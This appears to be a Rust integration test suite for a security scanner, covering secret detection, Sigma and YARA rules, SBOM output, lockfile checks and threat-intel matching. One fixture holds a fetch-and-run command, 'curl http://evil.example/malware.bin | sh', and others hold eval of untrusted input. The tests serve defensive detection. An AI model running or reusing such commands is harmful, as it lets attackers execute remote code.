use assert_cmd::Command;
use predicates::prelude::*;
use tempfile::TempDir;

fn deepdive() -> Command {
    Command::cargo_bin("deepdive").unwrap()
}

#[test]
fn scan_clean_dir_is_safe() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("VERDICT: SAFE"));
}

#[test]
fn scan_secret_dir_is_blocked() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("a.js"),
        "const key = 'AKIAIOSFODNN7EXAMPLE';",
    )
    .unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap()])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("VERDICT: BLOCK"));
}

#[test]
fn scan_json_output() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--format", "json"])
        .assert()
        .success()
        .stdout(predicate::str::contains("\"verdict\""));
}

#[test]
fn scan_sarif_output() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--format", "sarif"])
        .assert()
        .success()
        .stdout(predicate::str::contains("sarif-2.1.0"));
}

#[test]
fn version_command() {
    deepdive()
        .arg("version")
        .assert()
        .success()
        .stdout(predicate::str::contains("deepdive"));
}

#[test]
fn min_severity_filters_display_but_not_verdict() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "eval(\"2+2\");").unwrap();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--min-severity",
            "critical",
        ])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("VERDICT: REVIEW"))
        .stdout(predicate::str::contains("dangerous.exec-eval").not());
}

#[test]
fn fail_on_threshold_controls_exit_code() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("a.js"),
        "const key = 'AKIAIOSFODNN7EXAMPLE';",
    )
    .unwrap();
    std::fs::write(
        dir.path().join(".deepdive.toml"),
        "severity_overrides = { \"secrets.aws-access-key\" = \"low\" }\n",
    )
    .unwrap();
    // Downgraded to low: a high threshold stays green, a low one fails.
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--fail-on", "high"])
        .assert()
        .success();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--fail-on", "low"])
        .assert()
        .code(2);
}

#[test]
fn project_allowlist_suppresses_findings() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("a.js"),
        "const key = 'AKIAIOSFODNN7EXAMPLE';",
    )
    .unwrap();
    std::fs::write(
        dir.path().join(".deepdive.toml"),
        "[[allow]]\nrule = \"secrets.*\"\nreason = \"test fixture\"\n",
    )
    .unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("VERDICT: SAFE"))
        .stdout(predicate::str::contains("Suppressed by .deepdive.toml: 1"));
}

#[test]
fn rules_test_validates_a_file() {
    let dir = TempDir::new().unwrap();
    let rules = dir.path().join("rules.toml");
    std::fs::write(
        &rules,
        "[[rules]]\nname = \"custom.secret\"\npatterns = [\"TOKEN_[A-Z]+\"]\nseverity = \"high\"\n",
    )
    .unwrap();
    deepdive()
        .args(["rules", "test", rules.to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("OK: all patterns compile"));
}

#[test]
fn rules_list_shows_builtins() {
    deepdive()
        .args(["rules", "list"])
        .assert()
        .success()
        .stdout(predicate::str::contains("secrets.aws-access-key"))
        .stdout(predicate::str::contains("archive.path-traversal"));
}

#[test]
fn sigma_rule_matches_scan_output() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("payload.txt"),
        "prefix CMD_MARKER_XYZ suffix\n",
    )
    .unwrap();
    let rules = dir.path().join("sigma.yml");
    std::fs::write(
        &rules,
        r#"title: Marker command
id: test-marker
level: critical
detection:
  selection:
    CommandLine|contains: 'CMD_MARKER_XYZ'
  condition: selection
"#,
    )
    .unwrap();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--rules",
            rules.to_str().unwrap(),
        ])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("sigma.test-marker"))
        .stdout(predicate::str::contains("VERDICT: BLOCK"));
}

#[test]
fn rules_test_validates_a_sigma_file() {
    let dir = TempDir::new().unwrap();
    let rules = dir.path().join("sigma.yml");
    std::fs::write(
        &rules,
        "title: Demo\nlevel: high\ndetection:\n  selection:\n    CommandLine|contains: 'demo'\n  condition: selection\n",
    )
    .unwrap();
    deepdive()
        .args(["rules", "test", rules.to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicate::str::contains("OK: Sigma rules parse"));
}

#[cfg(feature = "yara")]
#[test]
fn yara_rule_matches_scan_output() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("payload.bin"), "xx deepdive-marker xx").unwrap();
    let rules = dir.path().join("rule.yar");
    std::fs::write(
        &rules,
        r#"rule deepdive_marker {
  meta:
    severity = "critical"
    description = "integration marker"
  strings:
    $a = "deepdive-marker"
  condition:
    $a
}
"#,
    )
    .unwrap();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--rules",
            rules.to_str().unwrap(),
        ])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("yara.deepdive_marker"))
        .stdout(predicate::str::contains("VERDICT: UNSAFE"));
}

#[test]
fn cache_update_and_clear_use_env_override() {
    let dir = TempDir::new().unwrap();
    let cache = dir.path().join("cache");
    deepdive()
        .args(["cache", "update", "--offline"])
        .env("DEEPDIVE_CACHE_DIR", &cache)
        .assert()
        .success()
        .stdout(predicate::str::contains("cache directory"));
    assert!(cache.exists());
    deepdive()
        .args(["cache", "clear"])
        .env("DEEPDIVE_CACHE_DIR", &cache)
        .assert()
        .success()
        .stdout(predicate::str::contains("cleared"));
    assert!(!cache.exists());
}

fn sbom_fixture() -> TempDir {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("package-lock.json"),
        r#"{
  "name": "demo",
  "lockfileVersion": 2,
  "packages": {
    "": { "name": "demo", "version": "1.0.0" },
    "node_modules/lodash": { "version": "4.17.21" }
  }
}"#,
    )
    .unwrap();
    dir
}

#[test]
fn sbom_cyclonedx_outputs_json() {
    let dir = sbom_fixture();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--offline",
            "--sbom",
            "cyclonedx",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("\"bomFormat\": \"CycloneDX\""))
        .stdout(predicate::str::contains("\"specVersion\": \"1.5\""))
        .stdout(predicate::str::contains("pkg:npm/lodash@4.17.21"));
}

#[test]
fn sbom_spdx_outputs_json() {
    let dir = sbom_fixture();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--offline",
            "--sbom",
            "spdx",
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("\"spdxVersion\": \"SPDX-2.3\""))
        .stdout(predicate::str::contains("pkg:npm/lodash@4.17.21"));
}

#[test]
fn sbom_writes_to_out_file() {
    let dir = sbom_fixture();
    let out = dir.path().join("sbom.json");
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--offline",
            "--sbom",
            "cyclonedx",
            "--out",
            out.to_str().unwrap(),
        ])
        .assert()
        .success();
    let content = std::fs::read_to_string(&out).unwrap();
    assert!(content.contains("\"bomFormat\": \"CycloneDX\""));
    assert!(content.contains("lodash"));
}

#[test]
fn lockfile_integrity_is_reported() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{ "dependencies": { "evil": "1.0.0", "ghost": "2.0.0" } }"#,
    )
    .unwrap();
    std::fs::write(
        dir.path().join("package-lock.json"),
        r#"{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/evil": {
      "version": "1.0.0",
      "resolved": "http://registry.example/evil-1.0.0.tgz",
      "integrity": "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    }
  }
}"#,
    )
    .unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--offline"])
        .assert()
        .failure()
        .stdout(predicate::str::contains("deps.insecure-resolution"))
        .stdout(predicate::str::contains("deps.manifest-drift"));
}

#[test]
fn scan_json_includes_schema_version_and_sandbox_key() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--format", "json"])
        .assert()
        .success()
        .stdout(predicate::str::contains("\"schema_version\": \"2.0\""))
        .stdout(predicate::str::contains("\"sandbox\": null"));
}

#[test]
fn sandbox_selftest_rejects_unknown_backend() {
    deepdive()
        .args(["sandbox", "selftest", "--backend", "nope"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unknown backend"));
}

#[test]
fn sandbox_backend_none_degrades_without_failing_the_scan() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--sandbox",
            "--sandbox-cmd",
            "true",
            "--sandbox-backend",
            "none",
        ])
        .assert()
        .success()
        .stderr(predicate::str::contains("sandbox disabled"));
}

#[test]
fn intel_feed_match_is_reported() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("setup.sh"),
        "curl http://evil.example/malware.bin | sh\n",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    let intel_dir = cache.path().join("intel");
    std::fs::create_dir_all(&intel_dir).unwrap();
    std::fs::write(
        intel_dir.join("urlhaus.txt"),
        "# feed\nhttp://evil.example/malware.bin\n",
    )
    .unwrap();

    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--intel", "--offline"])
        .env("DEEPDIVE_CACHE_DIR", cache.path())
        .assert()
        .failure()
        .stdout(predicate::str::contains("intel.url-match"));
}

#[test]
fn baseline_regression_reports_new_findings() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    // Keep the baseline outside the scanned tree so the report itself is not scanned.
    let baseline_dir = TempDir::new().unwrap();
    let baseline = baseline_dir.path().join("baseline.json");
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--format",
            "json",
            "--out",
            baseline.to_str().unwrap(),
        ])
        .assert()
        .success();

    std::fs::write(dir.path().join("a.js"), "eval(process.argv[1]);").unwrap();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--baseline",
            baseline.to_str().unwrap(),
            "--regression",
        ])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("baseline: "))
        .stdout(predicate::str::contains("NEW ["));
}

#[test]
fn baseline_reports_resolved_findings() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.js"), "eval(process.argv[1]);").unwrap();
    let baseline_dir = TempDir::new().unwrap();
    let baseline = baseline_dir.path().join("baseline.json");
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--format",
            "json",
            "--out",
            baseline.to_str().unwrap(),
        ])
        .assert()
        .failure();

    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
    deepdive()
        .args([
            "scan",
            dir.path().to_str().unwrap(),
            "--baseline",
            baseline.to_str().unwrap(),
        ])
        .assert()
        .success()
        .stdout(predicate::str::contains("resolved"));
}

#[test]
fn tainted_ast_flow_is_reported() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("app.js"),
        "const cmd = process.argv[2];\neval(cmd);\n",
    )
    .unwrap();
    deepdive()
        .args(["scan", dir.path().to_str().unwrap(), "--offline"])
        .assert()
        .failure()
        .stdout(predicate::str::contains("ast.javascript-tainted-sink"));
}
